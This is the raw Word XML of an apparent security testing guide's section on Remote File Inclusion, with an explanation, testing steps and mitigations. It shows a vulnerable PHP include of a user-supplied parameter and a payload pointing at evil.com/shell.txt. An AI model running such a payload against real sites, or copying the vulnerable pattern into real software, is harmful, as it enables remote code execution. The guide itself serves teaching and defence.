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F913" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>6️</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>⃣</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Testing for Remote File Inclusion (RFI)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FB0A11" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA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What is it?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BE28EA" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00EB7670">
        <w:t>Attacker includes</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00EB7670">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">remote </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00EB7670">
        <w:t xml:space="preserve"> hosted elsewhere.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A343A81" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA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Example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B521C2" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:r w:rsidRPr="00EB7670">
        <w:t>include($_GET['file']</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00EB7670">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1FDCEBFA" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:r w:rsidRPr="00EB7670">
        <w:t>Payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7955A58A" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:r w:rsidRPr="00EB7670">
        <w:t>?file=http://evil.com/shell.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BCA986" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA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Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C06667" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Manual</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB7670">
        <w:t>: Inject remote URLs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D254667" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Burp Suite</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB7670">
        <w:t>: Observe if external requests are made.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0A8DBF" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Indicators</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB7670">
        <w:t>: Remote script execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41ECB84C" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>🔹</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB7670">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31670245" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB7670">
        <w:t xml:space="preserve">Disable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00EB7670">
        <w:t>allow_url_include</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00EB7670">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CECF8E" w14:textId="77777777" w:rsidR="002103EA" w:rsidRPr="00EB7670" w:rsidRDefault="002103EA" w:rsidP="002103EA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB7670">
        <w:t>Whitelist file paths.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130BA5AD" w14:textId="77777777" w:rsidR="004E075B" w:rsidRPr="002103EA" w:rsidRDefault="004E075B" w:rsidP="002103EA"/>
    <w:sectPr w:rsidR="004E075B" w:rsidRPr="002103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786A88"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7064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C4817"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C6D2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6074C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="198A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268582">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="348289928">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="682324943">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1682076295">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1485856813">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1803107398">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="672073673">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1589773664">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1326591360">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="785932280">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1878228065">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1432778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3EA"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="004E075B"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E837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1ED78"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{4CF7C54D-5D86-48DD-9C42-FB0C491B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2025-08-17T21:59:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>